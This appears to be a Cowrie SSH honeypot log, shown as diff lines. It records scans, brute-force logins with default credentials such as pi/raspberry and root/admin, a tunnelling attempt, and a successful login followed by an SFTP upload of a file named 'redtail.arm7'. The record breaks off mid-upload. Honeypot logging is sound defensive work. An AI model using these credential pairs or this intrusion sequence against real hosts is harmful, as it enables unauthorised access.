+2024-06-07T15:38:35.661040Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 184.105.247.211:50489 (172.31.41.134:2222) [session: 008af91b598f]
+2024-06-07T15:38:35.661821Z [HoneyPotSSHTransport,132,184.105.247.211] Remote SSH version:  {  w\x94\xea\xa8\xe8\x8dM\x8e"r⛖\x94\xf3.|Պ(\xd1 H\xb5C\x82!^w  \xc0/\xc0+\xc0\xc0\xc0\xc0	\xc0\xc0
+2024-06-07T15:38:35.662226Z [HoneyPotSSHTransport,132,184.105.247.211] Bad protocol version identification: b'\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x94\xea\xa8\xe8\x8dM\x8e"r\xe2\x9b\x96\x94\xf3\r\x15\x0e.|\x1b\xd5\x8a(\xd1\x00H\xb5C\x82!^w\x00\x00\x1a\xc0/\xc0+\xc0\x11\xc0\x07\xc0\x13\xc0\t\xc0\x14\xc0'
+2024-06-07T15:38:35.662488Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T15:38:35.662584Z [HoneyPotSSHTransport,132,184.105.247.211] Connection lost after 0 seconds
+2024-06-07T16:12:38.631994Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 18.212.16.201:55875 (172.31.41.134:2222) [session: e605c2898d09]
+2024-06-07T16:14:38.733026Z [-] Timeout reached in HoneyPotSSHTransport
+2024-06-07T16:14:38.733503Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T16:14:38.733615Z [HoneyPotSSHTransport,133,18.212.16.201] Connection lost after 120 seconds
+2024-06-07T16:42:29.792799Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 82.49.164.124:36826 (172.31.41.134:2222) [session: 1cec91340d41]
+2024-06-07T16:42:29.793643Z [HoneyPotSSHTransport,134,82.49.164.124] Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Raspbian-5+deb11u3
+2024-06-07T16:42:30.114385Z [HoneyPotSSHTransport,134,82.49.164.124] SSH client hassh fingerprint: c11b200866cf918393e62ea25d851d90
+2024-06-07T16:42:30.115583Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T16:42:30.115691Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T16:42:30.115782Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T16:42:30.118604Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 82.49.164.124:36830 (172.31.41.134:2222) [session: 8028b1d4bdb7]
+2024-06-07T16:42:30.126893Z [HoneyPotSSHTransport,135,82.49.164.124] Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Raspbian-5+deb11u3
+2024-06-07T16:42:30.440755Z [HoneyPotSSHTransport,135,82.49.164.124] SSH client hassh fingerprint: c11b200866cf918393e62ea25d851d90
+2024-06-07T16:42:30.442024Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T16:42:30.442151Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T16:42:30.442234Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T16:42:30.760583Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T16:42:31.079162Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T16:42:31.103157Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T16:42:31.398693Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'none'
+2024-06-07T16:42:31.418215Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T16:42:31.717615Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'
+2024-06-07T16:42:31.717995Z [HoneyPotSSHTransport,134,82.49.164.124] Could not read etc/userdb.txt, default database activated
+2024-06-07T16:42:31.718161Z [HoneyPotSSHTransport,134,82.49.164.124] login attempt [b'pi'/b'raspberry'] failed
+2024-06-07T16:42:31.733235Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'none'
+2024-06-07T16:42:32.048127Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'
+2024-06-07T16:42:32.048492Z [HoneyPotSSHTransport,135,82.49.164.124] Could not read etc/userdb.txt, default database activated
+2024-06-07T16:42:32.048656Z [HoneyPotSSHTransport,135,82.49.164.124] login attempt [b'pi'/b'raspberryraspberry993311'] failed
+2024-06-07T16:42:32.720327Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' failed auth b'password'
+2024-06-07T16:42:32.720558Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T16:42:33.040242Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T16:42:33.040460Z [HoneyPotSSHTransport,134,82.49.164.124] Connection lost after 3 seconds
+2024-06-07T16:42:33.050205Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' failed auth b'password'
+2024-06-07T16:42:33.050514Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T16:42:33.367608Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T16:42:33.367832Z [HoneyPotSSHTransport,135,82.49.164.124] Connection lost after 3 seconds
+2024-06-07T17:11:52.474096Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 198.235.24.244:63110 (172.31.41.134:2222) [session: b9d4db99ab80]
+2024-06-07T17:11:53.078816Z [HoneyPotSSHTransport,136,198.235.24.244] Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey
+2024-06-07T17:11:54.349062Z [HoneyPotSSHTransport,136,198.235.24.244] SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0
+2024-06-07T17:11:54.350337Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T17:11:54.350456Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T17:11:54.350563Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T17:11:57.420937Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T17:11:57.421140Z [HoneyPotSSHTransport,136,198.235.24.244] Connection lost after 4 seconds
+2024-06-07T18:11:15.910581Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 155.254.29.143:52632 (172.31.41.134:2222) [session: d12b2ecc0fa3]
+2024-06-07T18:11:15.911482Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T18:11:15.911588Z [HoneyPotSSHTransport,137,155.254.29.143] Connection lost after 0 seconds
+2024-06-07T19:38:35.736624Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 205.210.31.135:62490 (172.31.41.134:2222) [session: a4b0ce35f603]
+2024-06-07T19:38:36.710553Z [HoneyPotSSHTransport,138,205.210.31.135] Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey
+2024-06-07T19:38:38.185964Z [HoneyPotSSHTransport,138,205.210.31.135] SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0
+2024-06-07T19:38:38.187304Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T19:38:38.187416Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T19:38:38.187510Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T19:38:42.469210Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T19:38:42.469412Z [HoneyPotSSHTransport,138,205.210.31.135] Connection lost after 6 seconds
+2024-06-07T20:53:36.205129Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 199.45.154.51:37964 (172.31.41.134:2222) [session: 2ff5470d0259]
+2024-06-07T20:53:37.661056Z [HoneyPotSSHTransport,139,199.45.154.51] Remote SSH version: SSH-2.0-Go
+2024-06-07T20:53:37.661789Z [HoneyPotSSHTransport,139,199.45.154.51] SSH client hassh fingerprint: 873a5fb5fedc2d4f8638ebde4abc6cfc
+2024-06-07T20:53:37.662935Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T20:53:37.663104Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T20:53:37.663205Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T20:53:38.318084Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T20:53:52.769875Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T20:53:52.770088Z [HoneyPotSSHTransport,139,199.45.154.51] Connection lost after 16 seconds
+2024-06-07T21:22:25.579891Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 192.42.116.208:30022 (172.31.41.134:2222) [session: 74f2cf7ff810]
+2024-06-07T21:22:25.862852Z [HoneyPotSSHTransport,140,192.42.116.208] Remote SSH version: SSH-2.0-OpenSSH_9.3
+2024-06-07T21:22:27.313140Z [HoneyPotSSHTransport,140,192.42.116.208] SSH client hassh fingerprint: 8be24434d6b888b4f710f3e821de0c1a
+2024-06-07T21:22:27.314381Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'
+2024-06-07T21:22:27.314489Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:22:27.314580Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:22:28.553615Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:22:28.554009Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:22:29.158542Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2024-06-07T21:22:29.893193Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'publickey'
+2024-06-07T21:22:29.893760Z [HoneyPotSSHTransport,140,192.42.116.208] public key attempt for user b'root' of type b'ssh-rsa' with fingerprint d4:98:c4:f3:12:ef:3e:29:38:34:62:21:fd:99:ec:ef
+2024-06-07T21:22:29.894452Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'publickey'
+2024-06-07T21:22:29.894572Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] reason: ('Incorrect signature', None)
+2024-06-07T21:22:30.550536Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T21:22:30.550919Z [HoneyPotSSHTransport,140,192.42.116.208] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:22:30.551085Z [HoneyPotSSHTransport,140,192.42.116.208] login attempt [b'root'/b'admin'] succeeded
+2024-06-07T21:22:30.551646Z [HoneyPotSSHTransport,140,192.42.116.208] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T21:22:30.551978Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T21:22:30.552168Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T21:22:48.182826Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'direct-tcpip' request
+2024-06-07T21:22:48.183070Z [HoneyPotSSHTransport,140,192.42.116.208] direct-tcp connection request to google.com:443 from 127.0.0.1:49194
+2024-06-07T21:22:48.828370Z [HoneyPotSSHTransport,140,192.42.116.208] discarded direct-tcp forward request 0 to google.com:443 with data b'\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\x1c\xba"U\xda]\xba|\xa6T\xc7\xdb\x03m\x9f{\xf7\x84\x80\xb7r\x0b*w\xba\xa0\xb1\xa3n\\q\xb8 D\xb9\xb5\xa2zSeCh\xe1f3h\x06\xbd\r\x87\x9e\xe7q\x08\x8cg\xc4\xbd/\xb1\xe1\xeal@\x0b\x00>\x13\x02\x13\x03\x13\x01\xc0,\xc00\x00\x9f\xcc\xa9\xcc\xa8\xcc\xaa\xc0+\xc0/\x00\x9e\xc0$\xc0(\x00k\xc0#\xc0\'\x00g\xc0\n\xc0\x14\x009\xc0\t\xc0\x13\x003\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x01u\x00\x00\x00\x0f\x00\r\x00\x00\ngoogle.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00\x10\x00\x0e\x00\x0c\x02h2\x08http/1.1\x00\x16\x00\x00\x00\x17\x00\x00\x001\x00\x00\x00\r\x000\x00.\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x02\x03\x03\x01\x02\x01\x03\x02\x02\x02\x04\x02\x05\x02\x06\x02\x00+\x00\t\x08\x03\x04\x03\x03\x03\x02\x03\x01\x00-\x00\x02\x01\x01\x003\x00&\x00$\x00\x1d\x00 \xe4\x12\xbb\x80\xd6\xdb\xb0\x8a\x9bi\x12\xac\x80z\xe8"\xf0\xb7\x96\xef\x9c2\x8e\x9a\x129e\x04\x860t~\x00\x15\x00\xb7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+2024-06-07T21:22:48.829082Z [cowrie.ssh.forwarding.FakeForwardingChannel#error] failed to connect to google.com:443: Connection refused
+2024-06-07T21:22:48.829195Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2024-06-07T21:22:49.410117Z [cowrie.ssh.forwarding.FakeForwardingChannel#info] remote close
+2024-06-07T21:22:49.429246Z [HoneyPotSSHTransport,140,192.42.116.208] Got remote error, code 11 reason: b'disconnected by user'
+2024-06-07T21:22:49.429599Z [HoneyPotSSHTransport,140,192.42.116.208] avatar root logging out
+2024-06-07T21:22:49.429718Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:22:49.429800Z [HoneyPotSSHTransport,140,192.42.116.208] Connection lost after 23 seconds
+2024-06-07T21:34:46.172086Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 198.235.24.237:56382 (172.31.41.134:2222) [session: d91ab7cbdd04]
+2024-06-07T21:34:46.466527Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:34:46.466736Z [HoneyPotSSHTransport,141,198.235.24.237] Connection lost after 0 seconds
+2024-06-07T21:34:46.667241Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 95.130.227.243:45540 (172.31.41.134:2222) [session: 8f36ee333667]
+2024-06-07T21:34:46.761698Z [HoneyPotSSHTransport,142,95.130.227.243] Remote SSH version: SSH-2.0-libssh2_1.11.0
+2024-06-07T21:34:47.056511Z [HoneyPotSSHTransport,142,95.130.227.243] SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439
+2024-06-07T21:34:47.057755Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T21:34:47.057875Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:34:47.057968Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:34:47.708634Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:34:48.003986Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:34:48.377524Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'mysql' trying auth b'password'
+2024-06-07T21:34:48.377870Z [HoneyPotSSHTransport,142,95.130.227.243] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:34:48.378033Z [HoneyPotSSHTransport,142,95.130.227.243] login attempt [b'mysql'/b'password'] failed
+2024-06-07T21:34:49.379874Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'mysql' failed auth b'password'
+2024-06-07T21:34:49.380117Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:34:49.750890Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:34:49.751091Z [HoneyPotSSHTransport,142,95.130.227.243] Connection lost after 3 seconds
+2024-06-07T21:34:57.041735Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 95.130.227.243:50364 (172.31.41.134:2222) [session: 4b46e683259b]
+2024-06-07T21:34:57.116763Z [HoneyPotSSHTransport,143,95.130.227.243] Remote SSH version: SSH-2.0-libssh2_1.11.0
+2024-06-07T21:34:57.405407Z [HoneyPotSSHTransport,143,95.130.227.243] SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439
+2024-06-07T21:34:57.406598Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T21:34:57.406705Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:34:57.406796Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:34:57.996593Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:34:58.245651Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:34:58.597343Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'market' trying auth b'password'
+2024-06-07T21:34:58.597683Z [HoneyPotSSHTransport,143,95.130.227.243] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:34:58.597861Z [HoneyPotSSHTransport,143,95.130.227.243] login attempt [b'market'/b'market'] failed
+2024-06-07T21:34:59.599699Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'market' failed auth b'password'
+2024-06-07T21:34:59.599933Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:34:59.927310Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:34:59.927507Z [HoneyPotSSHTransport,143,95.130.227.243] Connection lost after 2 seconds
+2024-06-07T21:35:07.252599Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 95.130.227.243:36042 (172.31.41.134:2222) [session: 03989a73dab3]
+2024-06-07T21:35:07.434819Z [HoneyPotSSHTransport,144,95.130.227.243] Remote SSH version: SSH-2.0-libssh2_1.11.0
+2024-06-07T21:35:07.724948Z [HoneyPotSSHTransport,144,95.130.227.243] SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439
+2024-06-07T21:35:07.726185Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T21:35:07.726295Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:35:07.726386Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes256-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:35:08.409785Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:35:08.695107Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:35:09.097538Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T21:35:09.097849Z [HoneyPotSSHTransport,144,95.130.227.243] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:35:09.098017Z [HoneyPotSSHTransport,144,95.130.227.243] login attempt [b'root'/b'bing'] succeeded
+2024-06-07T21:35:09.098541Z [HoneyPotSSHTransport,144,95.130.227.243] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T21:35:09.098887Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T21:35:09.099084Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T21:35:09.448271Z [HoneyPotSSHTransport,144,95.130.227.243] avatar root logging out
+2024-06-07T21:35:09.448496Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:35:09.448589Z [HoneyPotSSHTransport,144,95.130.227.243] Connection lost after 2 seconds
+2024-06-07T21:35:09.933302Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 164.215.103.47:46936 (172.31.41.134:2222) [session: 7ea58f455cda]
+2024-06-07T21:35:09.934026Z [HoneyPotSSHTransport,145,164.215.103.47] Remote SSH version: SSH-2.0-Go
+2024-06-07T21:35:10.244206Z [HoneyPotSSHTransport,145,164.215.103.47] SSH client hassh fingerprint: 5f904648ee8964bef0e8834012e26003
+2024-06-07T21:35:10.245356Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T21:35:10.245476Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:35:10.245571Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T21:35:10.555310Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:35:10.555730Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:35:10.864605Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2024-06-07T21:35:11.173773Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T21:35:11.174143Z [HoneyPotSSHTransport,145,164.215.103.47] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:35:11.174323Z [HoneyPotSSHTransport,145,164.215.103.47] login attempt [b'root'/b'bing'] succeeded
+2024-06-07T21:35:11.174842Z [HoneyPotSSHTransport,145,164.215.103.47] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T21:35:11.175189Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T21:35:11.175386Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T21:35:11.485140Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T21:35:11.485446Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T21:35:11.794317Z [twisted.conch.ssh.session#info] Asking for subsystem "b'sftp'"
+2024-06-07T21:35:11.794538Z [cowrie.shell.avatar.CowrieUser#debug] Subsystem lookup: {b'sftp': <class 'twisted.conch.ssh.filetransfer.FileTransferServer'>}
+2024-06-07T21:35:12.184784Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: INIT requestId=3
+2024-06-07T21:35:12.493809Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=1
+2024-06-07T21:35:12.494048Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP openFile: b'redtail.arm7'
+2024-06-07T21:35:13.112186Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=2
+2024-06-07T21:35:13.422105Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65654 to 65418 in channel 0
+2024-06-07T21:35:13.422342Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=3
+2024-06-07T21:35:13.731930Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=4
+2024-06-07T21:35:14.041868Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:14.042099Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=5
+2024-06-07T21:35:14.351683Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=6
+2024-06-07T21:35:14.663582Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:14.663828Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=7
+2024-06-07T21:35:14.973581Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=8
+2024-06-07T21:35:15.284736Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:15.284981Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=9
+2024-06-07T21:35:15.594494Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=10
+2024-06-07T21:35:15.904291Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:15.904528Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=11
+2024-06-07T21:35:16.214137Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=12
+2024-06-07T21:35:16.524016Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:16.524254Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=13
+2024-06-07T21:35:16.833730Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=14
+2024-06-07T21:35:17.143737Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:17.143964Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=15
+2024-06-07T21:35:17.453573Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=16
+2024-06-07T21:35:17.763282Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:17.763511Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=17
+2024-06-07T21:35:18.073111Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=18
+2024-06-07T21:35:18.382952Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:18.383182Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=19
+2024-06-07T21:35:18.692876Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=20
+2024-06-07T21:35:19.002824Z [cowrie.ssh.connection.CowrieSSHConnection#debug] adding 65612 to 65460 in channel 0
+2024-06-07T21:35:19.003064Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=21
